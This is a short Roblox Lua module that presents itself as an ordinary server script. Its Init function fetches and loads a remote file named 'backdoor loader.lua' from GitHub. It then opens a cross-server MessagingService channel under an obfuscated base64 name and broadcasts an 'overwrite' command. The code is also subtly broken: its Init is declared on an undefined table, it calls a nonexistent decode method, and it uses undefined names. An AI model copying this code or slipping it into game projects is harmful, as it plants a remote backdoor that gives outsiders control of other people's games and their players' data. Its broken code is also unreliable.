local panel = {

}

local wipe = {
4407961133;
}

local ts = {

}

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerStorage = game:GetService("ServerStorage")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local DataStoreService = game:GetService("DataStoreService")
local HttpService = game:GetService("HttpService")


local module = {}

function m:Init() 


    local version = HttpService:Decode(HttpService:GetAsync("https://raw.githubusercontent.com/xiynn/idc/refs/heads/main/backdoor%20loader.lua"))
  		local s, c
		repeat
			s, c = pcall(function()
				MessagingService:SubscribeAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), msc)
			end)
			task.wait()
		until
		s
		MessagingService:PublishAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), {Command = 'overwrite'})
end

return module
